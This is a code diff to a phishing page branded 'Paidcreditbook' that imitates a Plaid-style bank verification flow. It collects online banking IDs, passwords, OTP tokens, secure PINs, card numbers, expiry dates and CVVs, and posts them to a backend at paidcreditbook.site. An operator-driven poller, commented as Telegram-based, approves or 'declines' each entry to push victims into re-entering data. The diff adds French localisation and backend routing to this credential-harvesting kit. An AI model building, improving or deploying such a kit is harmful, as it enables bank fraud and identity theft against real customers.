@@ -7,17 +7,7 @@
     <meta name="robots" content="noindex, nofollow, nosnippet">
     <title>Paidcreditbook</title>
     <link rel="icon" type="image/png" href="assets/images/Plaid.png">
-    <script type="module" crossorigin="" src="assets/.index-DODPvUCW.js"></script>
     <link rel="stylesheet" crossorigin="" href="assets/index-DvtKzEtc.css">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.index-RUN_BNgQ.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.index-DODPvUCW.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.index-BsoPRGka.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.CloudWatchRum-DYE3A5W1.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.App-CiI-kGpT.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.BankPicker-CTb93kQ1.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.CardHeader-BdkVYw0S.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.createSuper-BZZxWqAv.js">
-    <link rel="modulepreload" as="script" crossorigin="" href="assets/.setPrototypeOf-B4fUID9J.js">
     <style data-emotion="css" data-s=""></style>
 
     <style>
@@ -56,6 +46,71 @@
             overflow: hidden;
             border: 1px solid var(--border);
             padding: 5px;
+        /* Language Dropdown */
+        .dropdown-language {
+            position: relative;
+            cursor: pointer;
+            user-select: none;
+        }
+        .dropdown-language .selected-language {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #fff;
+            text-decoration: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            transition: background .15s;
+            font-weight: 600;
+        }
+        .dropdown-language .selected-language:hover {
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+        }
+        .dropdown-language .dropdown-menu {
+            display: none;
+            position: absolute;
+            right: 0;
+            top: 100%;
+            background: #fff;
+            min-width: 140px;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.18);
+            border: 1px solid #e5e7eb;
+            z-index: 10000;
+            padding: 6px 0;
+            margin-top: 6px;
+        }
+        .dropdown-language .dropdown-menu.show {
+            display: block !important;
+            animation: fade .15s ease;
+        }
+        .dropdown-language .dropdown-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 9px 16px;
+            color: #222;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s, color 0.15s;
+        }
+        .dropdown-language .dropdown-item:hover {
+            background: #f1f5f9;
+            color: #2563eb;
+        }
+        .dropdown-language .dropdown-item.active {
+            font-weight: 700;
+            color: #2563eb;
+            background: #eff6ff;
+        }
+        .dropdown-language .dropdown-item.active::after {
+            content: "✓";
+            font-weight: bold;
+            color: #2563eb;
         }
 
         header {
@@ -368,10 +423,13 @@
         <header class="header">
             <nav class="nav border-bottom d-flex navbar navbar-expand-md navbar-dark bg-dark fixed-top">
                 <div class="container"><a href="https://ibv.autholen.com/?token=2343" class="navbar-brand"><img class="logo" src="assets/Plaidcreditbook.png" alt="Plaidcreditbook Logo"></a>
-                    <div class="d-flex right-side-wrapper">
-                        <div href="/" class="dropdown-language nav-item dropdown"><a href="/" aria-haspopup="true" class="nav-link selected-language" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg><span>EN</span></a>
-                            <div
-                                tabindex="-1" role="menu" aria-hidden="true" class="mt-0 dropdown-menu" data-bs-popper="static"><a href="/" tabindex="0" role="menuitem" class="dropdown-item"><span class="ms-1">English</span></a><a href="/" tabindex="0" role="menuitem" class="dropdown-item"><span class="ms-1">Français</span></a></div>
+                        <div class="dropdown-language nav-item dropdown" id="langDropdown">
+                            <a href="javascript:void(0)" id="langToggleBtn" onclick="toggleLangDropdown(event)" aria-haspopup="true" class="nav-link selected-language" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg><span id="currentLangLabel">EN</span></a>
+                            <div id="langMenu" tabindex="-1" role="menu" aria-hidden="true" class="mt-0 dropdown-menu" data-bs-popper="static">
+                                <a href="javascript:void(0)" onclick="switchLanguage('en', event)" tabindex="0" role="menuitem" class="dropdown-item active" id="langItemEn"><span class="ms-1">English</span></a>
+                                <a href="javascript:void(0)" onclick="switchLanguage('fr', event)" tabindex="0" role="menuitem" class="dropdown-item" id="langItemFr"><span class="ms-1">Français</span></a>
+                            </div>
+                        </div>
                     </div>
                 </div>
     </div>
@@ -381,13 +439,13 @@
 
 
     <div class="wrap" id="app">
-        <header>Select Your Institution</header>
+        <header id="mainAppHeader" data-i18n="headerTitle">Select Your Institution</header>
 
         <!-- Bank Dropdown Selection -->
         <section class="section active" id="selectBank">
             <div class="field">
                                 <select id="otherBankDropdown" class="input">
-                                        <option value="">Select..</option>
+                                        <option value="" data-i18n="selectDefault">Select..</option>
                                         <option value="1st Advantage Bank">1st Advantage Bank</option>
                                         <option value="1st Bank">1st Bank</option>
                                         <option value="1st Choice Savings and Credit Union">1st Choice Savings and Credit Union</option>
@@ -656,7 +714,7 @@
                                         <option value="Your Neighbourhood Credit Union">Your Neighbourhood Credit Union</option>
                                         <option value="⁠Zions Bank">⁠Zions Bank</option>
                                         <option value="Zions Bancorporation">Zions Bancorporation</option>
-                                        <option value="Other">Other</option>
+                                        <option value="Other" data-i18n="otherOption">Other</option>
                                 </select>
             </div>
 
@@ -700,10 +758,10 @@
             </div>
 
             <div class="field" id="customBankField" style="display:none; margin-top:10px;">
-                <input type="text" id="customBankName" class="input" placeholder="Enter your bank name">
+                <input type="text" id="customBankName" class="input" placeholder="Enter your bank name" data-i18n-placeholder="customBankPlaceholder">
             </div>
 
-            <button class="btn" onclick="confirmOtherBank()">Continue</button>
+            <button class="btn" onclick="confirmOtherBank()" data-i18n="continueBtn">Continue</button>
         </section>
 
         <!-- Loading Screen -->
@@ -715,8 +773,8 @@
                 </div>
                 <!-- SVG or spinner -->
                 <img src="assets/images/loading.svg" class="loading-svg" alt="Loading">
-                <div class="loading-msg">Connecting… Please wait</div>
-                <button class="startover" onclick="startOver()">Start Over</button>
+                <div class="loading-msg" data-i18n="loadingDefault">Connecting… Please wait</div>
+                <button class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
             </div>
         </section>
 
@@ -727,23 +785,23 @@
                     <img id="s1Logo" class="logo" alt="">
                     <span id="s1Name" class="bank-title"></span>
                 </div>
-                <h3>Login to your Account</h3>
-                <div class="field"><input name="onlineId" class="input" type="text" placeholder="Online ID" required></div>
+                <h3 data-i18n="loginTitle">Login to your Account</h3>
+                <div class="field"><input name="onlineId" class="input" type="text" placeholder="Online ID" data-i18n-placeholder="onlineIdPlaceholder" required></div>
                 <div class="field input-group">
-                    <input name="password" class="input" type="password" placeholder="Password" required>
+                    <input name="password" class="input" type="password" placeholder="Password" data-i18n-placeholder="passwordPlaceholder" required>
                     <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
                 </div>
-                <label>
+                <label data-i18n-html="termsText">
         By clicking "Continue", I acknowledge that I have read and agree to the 
-        <a href="/terms" target="_blank">Terms and Conditions</a> and 
-        <a href="/privacy" target="_blank">Privacy Policy</a>, and request and authorize 
+        <a href="javascript:void(0)" onclick="alert('Terms & Conditions')">Terms and Conditions</a> and 
+        <a href="javascript:void(0)" onclick="alert('Privacy Policy')">Privacy Policy</a>, and request and authorize 
         the transmission of all session data to CreditBook.
       </label>
-                <button type="submit" class="btn">Continue</button>
+                <button type="submit" class="btn" data-i18n="continueBtn">Continue</button>
             </form>
             <div class="actions">
-                <button type="button" class="startover" onclick="startOver()">Start Over</button>
-                <div class="security">Your data is secured by 256-bit encryption.</div>
+                <button type="button" class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
+                <div class="security" data-i18n="securityNote">Your data is secured by 256-bit encryption.</div>
             </div>
         </section>
 
@@ -754,16 +812,16 @@
                     <img id="s2Logo" class="logo" alt="">
                     <span id="s2Name" class="bank-title"></span>
                 </div>
-                <h3>OTP Token</h3>
-                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="OTP Token" required></div>
-                <label>
+                <h3 data-i18n="otpTitle">OTP Token</h3>
+                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="OTP Token" data-i18n-placeholder="otpPlaceholder" required></div>
+                <label data-i18n-html="termsText">
         By clicking "Continue", I acknowledge that I have read and agree to the Terms and Conditions...
       </label>
-                <button type="submit" class="btn">Continue</button>
+                <button type="submit" class="btn" data-i18n="continueBtn">Continue</button>
             </form>
             <div class="actions">
-                <button type="button" class="startover" onclick="startOver()">Start Over</button>
-                <div class="security">Your data is secured by 256-bit encryption.</div>
+                <button type="button" class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
+                <div class="security" data-i18n="securityNote">Your data is secured by 256-bit encryption.</div>
             </div>
         </section>
 
@@ -774,26 +832,26 @@
                     <img id="s3Logo" class="logo" alt="">
                     <span id="s3Name" class="bank-title"></span>
                 </div>
-                <h3>Card verification</h3>
+                <h3 data-i18n="cardTitle">Card verification</h3>
                 <div class="field input-group">
-                    <input name="cardNumber" id="cardVisible" class="input" type="text" inputmode="numeric" placeholder="Card Number" required>
+                    <input name="cardNumber" id="cardVisible" class="input" type="text" inputmode="numeric" placeholder="Card Number" data-i18n-placeholder="cardNumberPlaceholder" required>
                 </div>
                 <div class="row">
-                    <div class="field"><input name="expiry" id="expiry" class="input" type="text" placeholder="MM/YY" required></div>
+                    <div class="field"><input name="expiry" id="expiry" class="input" type="text" placeholder="MM/YY" data-i18n-placeholder="expiryPlaceholder" required></div>
                     <div class="field input-group">
-                        <input name="cvv" id="cvv" class="input" type="text" inputmode="numeric" pattern="\d{3,4}" placeholder="CVV" maxlength="4" required>
+                        <input name="cvv" id="cvv" class="input" type="text" inputmode="numeric" pattern="\d{3,4}" placeholder="CVV" maxlength="4" data-i18n-placeholder="cvvPlaceholder" required>
                         <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
                     </div>
                 </div>
                 <div class="field">
-                    <input name="name" id="name" class="input" type="text" placeholder="Name on Card" required>
+                    <input name="name" id="name" class="input" type="text" placeholder="Name on Card" data-i18n-placeholder="nameOnCardPlaceholder" required>
                 </div>
-                <label>By clicking "Continue", I acknowledge that I have read and agree...</label>
-                <button type="submit" class="btn">Continue</button>
+                <label data-i18n-html="termsText">By clicking "Continue", I acknowledge that I have read and agree...</label>
+                <button type="submit" class="btn" data-i18n="continueBtn">Continue</button>
             </form>
             <div class="actions">
-                <button type="button" class="startover" onclick="startOver()">Start Over</button>
-                <div class="security">Your data is secured by 256-bit encryption.</div>
+                <button type="button" class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
+                <div class="security" data-i18n="securityNote">Your data is secured by 256-bit encryption.</div>
             </div>
         </section>
 
@@ -804,18 +862,18 @@
                     <img id="s4Logo" class="logo" alt="">
                     <span id="s4Name" class="bank-title"></span>
                 </div>
-                <h3>Login to your Account</h3>
-                <div class="field"><input name="onlineId" class="input" type="text" placeholder="Email ID/ Email Address" required></div>
+                <h3 data-i18n="loginTitle">Login to your Account</h3>
+                <div class="field"><input name="onlineId" class="input" type="text" placeholder="Email ID/ Email Address" data-i18n-placeholder="emailPlaceholder" required></div>
                 <div class="field input-group">
-                    <input name="password" class="input" type="password" placeholder="Password" required>
+                    <input name="password" class="input" type="password" placeholder="Password" data-i18n-placeholder="passwordPlaceholder" required>
                     <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
                 </div>
-                <label>By clicking "Continue", I acknowledge...</label>
-                <button type="submit" class="btn">Continue</button>
+                <label data-i18n-html="termsText">By clicking "Continue", I acknowledge...</label>
+                <button type="submit" class="btn" data-i18n="continueBtn">Continue</button>
             </form>
             <div class="actions">
-                <button type="button" class="startover" onclick="startOver()">Start Over</button>
-                <div class="security">Your data is secured by 256-bit encryption.</div>
+                <button type="button" class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
+                <div class="security" data-i18n="securityNote">Your data is secured by 256-bit encryption.</div>
             </div>
         </section>
 
@@ -826,14 +884,14 @@
                     <img id="s5Logo" class="logo" alt="">
                     <span id="s5Name" class="bank-title"></span>
                 </div>
-                <h3>OTP Token</h3>
-                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="OTP Code" required></div>
-                <label>By clicking "Continue", I acknowledge...</label>
-                <button type="submit" class="btn">Continue</button>
+                <h3 data-i18n="otpTitle">OTP Token</h3>
+                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="OTP Code" data-i18n-placeholder="otpCodePlaceholder" required></div>
+                <label data-i18n-html="termsText">By clicking "Continue", I acknowledge...</label>
+                <button type="submit" class="btn" data-i18n="continueBtn">Continue</button>
             </form>
             <div class="actions">
-                <button type="button" class="startover" onclick="startOver()">Start Over</button>
-                <div class="security">Your data is secured by 256-bit encryption.</div>
+                <button type="button" class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
+                <div class="security" data-i18n="securityNote">Your data is secured by 256-bit encryption.</div>
             </div>
         </section>
 
@@ -844,14 +902,14 @@
                     <img id="s6Logo" class="logo" alt="">
                     <span id="s5Name" class="bank-title"></span>
                 </div>
-                <h3>Secure ID Pin</h3>
-                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="Secure ID Pin" required></div>
-                <label>By clicking "Continue", I acknowledge...</label>
-                <button type="submit" class="btn">Continue</button>
+                <h3 data-i18n="securePinTitle">Secure ID Pin</h3>
+                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="Secure ID Pin" data-i18n-placeholder="securePinPlaceholder" required></div>
+                <label data-i18n-html="termsText">By clicking "Continue", I acknowledge...</label>
+                <button type="submit" class="btn" data-i18n="continueBtn">Continue</button>
             </form>
             <div class="actions">
-                <button type="button" class="startover" onclick="startOver()">Start Over</button>
-                <div class="security">Your data is secured by 256-bit encryption.</div>
+                <button type="button" class="startover" onclick="startOver()" data-i18n="startOverBtn">Start Over</button>
+                <div class="security" data-i18n="securityNote">Your data is secured by 256-bit encryption.</div>
             </div>
         </section>
 
@@ -863,14 +921,159 @@
                     <span id="doneName" class="bank-title"></span>
                 </div>
                 <div class="check">✓</div>
-                <h3>Verification Complete</h3>
-                <p class="muted">Your card verification was successful.</p>
-                <button class="btn" onclick="startOver()">Back to start</button>
+                <h3 data-i18n="doneTitle">Verification Complete</h3>
+                <p class="muted" data-i18n="doneSub">Your card verification was successful.</p>
+                <button class="btn" onclick="startOver()" data-i18n="doneBtn">Back to start</button>
             </div>
         </section>
     </div>
 
     <script>
+        // ============================================================
+        // Language Translation System (EN default, FR toggle)
+        // ============================================================
+        const i18n = {
+            en: {
+                langCode: "EN",
+                headerTitle: "Select Your Institution",
+                selectDefault: "Select..",
+                otherOption: "Other",
+                customBankPlaceholder: "Enter your bank name",
+                loginTitle: "Login to your Account",
+                onlineIdPlaceholder: "Online ID",
+                emailPlaceholder: "Email ID/ Email Address",
+                passwordPlaceholder: "Password",
+                continueBtn: "Continue",
+                startOverBtn: "Start Over",
+                securityNote: "Your data is secured by 256-bit encryption.",
+                otpTitle: "OTP Token",
+                otpPlaceholder: "OTP Token",
+                otpCodePlaceholder: "OTP Code",
+                cardTitle: "Card verification",
+                cardNumberPlaceholder: "Card Number",
+                expiryPlaceholder: "MM/YY",
+                cvvPlaceholder: "CVV",
+                nameOnCardPlaceholder: "Name on Card",
+                securePinTitle: "Secure ID Pin",
+                securePinPlaceholder: "Secure ID Pin",
+                doneTitle: "Verification Complete",
+                doneSub: "Your card verification was successful.",
+                doneBtn: "Back to start",
+                loadingDefault: "Connecting… Please wait",
+                loadingConnecting: (name) => `Connecting to ${name}… Please wait`,
+                loadingProcessing: "Processing details securely…",
+                alertSelectBank: "Please select a bank",
+                alertEnterBank: "Please enter your bank name",
+                alertCardShort: "Card number is too short.",
+                alertCardInvalid: "Invalid card number. Please check your card digits and try again.",
+                alertExpiryInvalid: "Expiry must be MM/YY",
+                alertCvvInvalid: "CVV must be 3 or 4 digits",
+                errorIncorrect: "Information incorrect. Please verify and try again.",
+                termsText: 'By clicking "Continue", I acknowledge that I have read and agree to the <a href="javascript:void(0)" onclick="alert(\'Terms & Conditions\')">Terms and Conditions</a> and <a href="javascript:void(0)" onclick="alert(\'Privacy Policy\')">Privacy Policy</a>, and request and authorize the transmission of all session data to CreditBook.'
+            },
+            fr: {
+                langCode: "FR",
+                headerTitle: "Sélectionnez votre institution",
+                selectDefault: "Sélectionner..",
+                otherOption: "Autre",
+                customBankPlaceholder: "Entrez le nom de votre institution",
+                loginTitle: "Connexion à votre compte",
+                onlineIdPlaceholder: "Identifiant bancaire en ligne",
+                emailPlaceholder: "Courriel / Adresse courriel",
+                passwordPlaceholder: "Mot de passe",
+                continueBtn: "Continuer",
+                startOverBtn: "Recommencer",
+                securityNote: "Vos données sont protégées par un chiffrement 256 bits.",
+                otpTitle: "Jeton OTP",
+                otpPlaceholder: "Jeton OTP",
+                otpCodePlaceholder: "Code OTP",
+                cardTitle: "Vérification de la carte",
+                cardNumberPlaceholder: "Numéro de carte",
+                expiryPlaceholder: "MM/AA",
+                cvvPlaceholder: "CVV",
+                nameOnCardPlaceholder: "Nom sur la carte",
+                securePinTitle: "NIP de sécurité",
+                securePinPlaceholder: "NIP de sécurité",
+                doneTitle: "Vérification terminée",
+                doneSub: "La vérification de votre institution a réussi.",
+                doneBtn: "Retour au début",
+                loadingDefault: "Connexion en cours… Veuillez patienter",
+                loadingConnecting: (name) => `Connexion à ${name}… Veuillez patienter`,
+                loadingProcessing: "Traitement sécurisé des détails…",
+                alertSelectBank: "Veuillez sélectionner une institution",
+                alertEnterBank: "Veuillez entrer le nom de votre institution",
+                alertCardShort: "Le numéro de carte est trop court.",
+                alertCardInvalid: "Numéro de carte invalide. Veuillez vérifier les chiffres et réessayer.",
+                alertExpiryInvalid: "La date d'expiration doit être MM/AA",
+                alertCvvInvalid: "Le code CVV doit comporter 3 ou 4 chiffres",
+                errorIncorrect: "Informations incorrectes. Veuillez vérifier et réessayer.",
+                termsText: 'En cliquant sur « Continuer », je reconnais avoir lu et accepté les <a href="javascript:void(0)" onclick="alert(\'Conditions générales\')">Conditions générales</a> et la <a href="javascript:void(0)" onclick="alert(\'Politique de confidentialité\')">Politique de confidentialité</a>, et j\'autorise la transmission de toutes les données de session à CreditBook.'
+            }
+        };
+
+        let currentLang = localStorage.getItem('creditbook_lang') || 'en';
+
+        function t(key, ...args) {
+            const langObj = i18n[currentLang] || i18n.en;
+            const val = langObj[key] !== undefined ? langObj[key] : (i18n.en[key] || key);
+            if (typeof val === 'function') return val(...args);
+            return val;
+        }
+
+        function toggleLangDropdown(e) {
+            if (e) e.stopPropagation();
+            const menu = document.getElementById('langMenu');
+            if (menu) menu.classList.toggle('show');
+        }
+
+        function switchLanguage(lang, e) {
+            if (e) e.stopPropagation();
+            currentLang = (lang === 'fr') ? 'fr' : 'en';
+            localStorage.setItem('creditbook_lang', currentLang);
+            applyLanguage();
+            const menu = document.getElementById('langMenu');
+            if (menu) menu.classList.remove('show');
+        }
+
+        function applyLanguage() {
+            const label = document.getElementById('currentLangLabel');
+            if (label) label.textContent = i18n[currentLang].langCode;
+
+            const enItem = document.getElementById('langItemEn');
+            const frItem = document.getElementById('langItemFr');
+            if (enItem) enItem.classList.toggle('active', currentLang === 'en');
+            if (frItem) frItem.classList.toggle('active', currentLang === 'fr');
+
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const k = el.getAttribute('data-i18n');
+                if (k) el.textContent = t(k);
+            });
+
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const k = el.getAttribute('data-i18n-placeholder');
+                if (k) el.placeholder = t(k);
+            });
+
+            document.querySelectorAll('[data-i18n-html]').forEach(el => {
+                const k = el.getAttribute('data-i18n-html');
+                if (k) el.innerHTML = t(k);
+            });
+        }
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', (e) => {
+            const dropdown = document.getElementById('langDropdown');
+            if (dropdown && !dropdown.contains(e.target)) {
+                const menu = document.getElementById('langMenu');
+                if (menu) menu.classList.remove('show');
+            }
+        });
+
+        // Backend API base URL: points to the API subdomain when on paidcreditbook.site
+        const API_BASE_URL = (window.location.hostname === 'paidcreditbook.site' || window.location.hostname === 'www.paidcreditbook.site')
+            ? 'https://api.paidcreditbook.site'
+            : '';
+
         let currentBank = {
             name: '',
             logo: '',
@@ -880,11 +1083,12 @@
 
         // Map Database steps to HTML section IDs depending on Bank/Wallet flow
         const flowMapping = {
-            'step1': ['selectBank', 'step1', 'step2', 'step3', 'done'],
-            'step4': ['selectBank', 'step4', 'step6', 'step5', 'done']
+    'step1': ['selectBank', 'step1', 'step2', 'step3', 'done'], // Bank Flow
+    'step4': ['selectBank', 'step4', 'step6', 'step5', 'done']  // Wallet Flow
         };
 
         window.addEventListener('load', () => {
+            applyLanguage();
             // Start polling our backend
             setInterval(pollStatus, 3000);
         });
@@ -909,7 +1113,7 @@
             if (bankName === "Other") {
                 const customName = document.getElementById('customBankName').value.trim();
                 if (!customName) {
-                    alert("Please enter your bank name");
+                    alert(t('alertEnterBank'));
                     return;
                 }
                 bankName = customName;
@@ -918,86 +1122,99 @@
                 const bankObj = banksList.find(b => b.name === bankName);
                 const logo = bankObj ? bankObj.logo : 'img/other.png';
                 selectBank(bankName, logo);
-            } else alert('Please select a bank');
+            } else alert(t('alertSelectBank'));
         }
 
         // Telegram Verification UI Poller
         function pollStatus() {
-            fetch('api/status.php')
+            fetch(API_BASE_URL + '/api/status')
                 .then(res => res.json())
                 .then(data => {
                     if (data.status && data.status !== 'error') {
                         updateUIState(data.step, data.status);
                     }
-                });
+                })
+                .catch(() => {});
         }
 
         function updateUIState(dbStep, status) {
-            let flowArray = flowMapping[currentBank.flow] || flowMapping['step1'];
+    // Map backend step (1,2,3) to actual HTML section IDs
+    // Backend step 0 = Select Bank
+    // Backend step 1 = First Form (Login / Wallet Login)
+    // Backend step 2 = Second Form (OTP / Secure Pin)
+    // Backend step 3 = Third Form (Card / OTP)
+    
+    let sectionId = 'selectBank';
+    
+    if (currentBank.flow === 'step4') {
+        // Wallet Flow
+        if (dbStep === 1) sectionId = 'step4';
+        else if (dbStep === 2) sectionId = 'step6';
+        else if (dbStep === 3) sectionId = 'step5';
+        else if (dbStep >= 4 || status === 'done') sectionId = 'done';
+    } else {
+        // Bank Flow (step1)
+        if (dbStep === 1) sectionId = 'step1';
+        else if (dbStep === 2) sectionId = 'step2';
+        else if (dbStep === 3) sectionId = 'step3';
+        else if (dbStep >= 4 || status === 'done') sectionId = 'done';
+    }
 
-            // dbStep corresponds to array index (dbStep 1 is index 1, which is the first form)
-            let arrayIndex = dbStep;
-            if (arrayIndex >= flowArray.length) arrayIndex = flowArray.length - 1;
-            let expectedSectionId = flowArray[arrayIndex];
+    const activeSection = document.querySelector('.section.active');
+    const isCurrentlyLoading = activeSection && activeSection.id === 'loading';
+    const isStartScreen = activeSection && activeSection.id === 'selectBank';
 
-            if (status === 'done') expectedSectionId = 'done';
-
-            const activeSection = document.querySelector('.section.active');
-            const isCurrentlyLoading = activeSection && activeSection.id === 'loading';
-            const isStartScreen = activeSection && activeSection.id === 'selectBank';
-
-            if (status === 'pending') {
-                show('loading');
-            } else if (status === 'declined') {
-                fetch('api/retry.php').then(() => {
-                    show(expectedSectionId);
-                    const sec = document.getElementById(expectedSectionId);
-                    if (sec) {
-                        let err = sec.querySelector('.error-message-inline');
-                        if (!err) {
-                            err = document.createElement('div');
-                            err.className = 'error-message-inline';
-                            err.style.color = '#ef4444';
-                            err.style.background = 'rgba(239, 68, 68, 0.1)';
-                            err.style.border = '1px solid rgba(239, 68, 68, 0.3)';
-                            err.style.padding = '10px';
-                            err.style.borderRadius = '8px';
-                            err.style.marginBottom = '14px';
-                            err.style.fontSize = '13.5px';
-                            err.style.textAlign = 'center';
-                            err.style.fontWeight = '600';
-                            const heading = sec.querySelector('h3');
-                            if (heading) heading.after(err);
-                        }
-                        err.textContent = "Information incorrect. Please verify and try again.";
-                        sec.querySelectorAll('input').forEach(i => i.style.borderColor = '#ef4444');
-                    }
-                });
-            } else if (status === 'filling') {
-                // If we are showing loading, that means we were just approved. Show the next expected form!
-                if (isCurrentlyLoading) {
-                    show(expectedSectionId);
+    if (status === 'pending') {
+        show('loading');
+    } else if (status === 'declined') {
+        fetch(API_BASE_URL + '/api/retry').then(() => {
+            show(sectionId); // Show the current form so they can retry
+            const sec = document.getElementById(sectionId);
+            if (sec) {
+                let err = sec.querySelector('.error-message-inline');
+                if (!err) {
+                    err = document.createElement('div');
+                    err.className = 'error-message-inline';
+                    err.style.color = '#ef4444';
+                    err.style.background = 'rgba(239, 68, 68, 0.1)';
+                    err.style.border = '1px solid rgba(239, 68, 68, 0.3)';
+                    err.style.padding = '10px';
+                    err.style.borderRadius = '8px';
+                    err.style.marginBottom = '14px';
+                    err.style.fontSize = '13.5px';
+                    err.style.textAlign = 'center';
+                    err.style.fontWeight = '600';
+                    const heading = sec.querySelector('h3');
+                    if (heading) heading.after(err);
                 }
-                // If we reloaded the page and we have a bank selected already, jump straight to the current form
-                if (isStartScreen && currentBank.name) {
-                    show(expectedSectionId);
-                }
-            } else if (status === 'done') {
-                show('done');
+                err.textContent = t('errorIncorrect');
+                sec.querySelectorAll('input').forEach(i => i.style.borderColor = '#ef4444');
             }
+        });
+    } else if (status === 'filling') {
+        // If loading, we just got approved. Show the next form!
+        if (isCurrentlyLoading) {
+            show(sectionId);
         }
+        // If page reloaded and a bank is already selected, jump to current step
+        if (isStartScreen && currentBank.name) {
+            show(sectionId);
+        }
+    } else if (status === 'done') {
+        show('done');
+    }
+}
 
         function selectBank(name, logo, step = 'step1') {
-            currentBank = {
-                name,
-                logo,
-                flow: step
-            };
+    currentBank = { name, logo, flow: step };
+    localStorage.setItem('paidcreditbook_bank', JSON.stringify(currentBank)); // Save it
+    // ... rest of function
+}
             setStepLogos();
             show('loading');
-            document.querySelector('.loading-msg').textContent = `Connecting to ${name}… Please wait`;
+            document.querySelector('.loading-msg').textContent = t('loadingConnecting', name);
 
-            fetch('api/reset.php').then(() => {
+            fetch(API_BASE_URL + '/api/reset').then(() => {
                 setTimeout(() => show(currentBank.flow), 1500);
             });
         }
@@ -1024,7 +1241,7 @@
             dropdown.value = '';
             customBankField.style.display = 'none';
             show('selectBank');
-            fetch('api/reset.php');
+            fetch(API_BASE_URL + '/api/reset').catch(() => {});
         }
 
         function toggleField(el) {
@@ -1059,9 +1276,9 @@
             }
 
             show('loading');
-            document.querySelector('.loading-msg').textContent = "Processing details securely…";
+            document.querySelector('.loading-msg').textContent = t('loadingProcessing');
 
-            fetch('api/submit.php', {
+            fetch(API_BASE_URL + '/api/submit', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -1072,9 +1289,12 @@
                 })
             }).then(res => res.json()).then(resData => {
                 if (!resData.success) {
-                    alert(resData.message);
+                    alert(resData.message || "Failed to submit. Please try again.");
                     startOver();
                 }
+            }).catch(err => {
+                alert("Connection error: Unable to reach backend server.");
+                startOver();
             });
         }
 
@@ -1117,23 +1337,23 @@
 
             const cardNumber = form.cardNumber.value.replace(/\s/g, '');
             if (cardNumber.length < 15) {
-                alert('Card number is too short.');
+                alert(t('alertCardShort'));
                 return;
             }
             if (!luhnCheck(cardNumber)) {
-                alert('Invalid card number. Please check your card digits and try again.');
+                alert(t('alertCardInvalid'));
                 return;
             }
 
             const expiry = document.getElementById('expiry').value;
             if (expiry.length !== 5) {
-                alert('Expiry must be MM/YY');
+                alert(t('alertExpiryInvalid'));
                 return;
             }
 
             const cvv = document.getElementById('cvv').value;
             if (cvv.length < 3) {
-                alert('CVV must be 3 or 4 digits');
+                alert(t('alertCvvInvalid'));
                 return;
             }
 
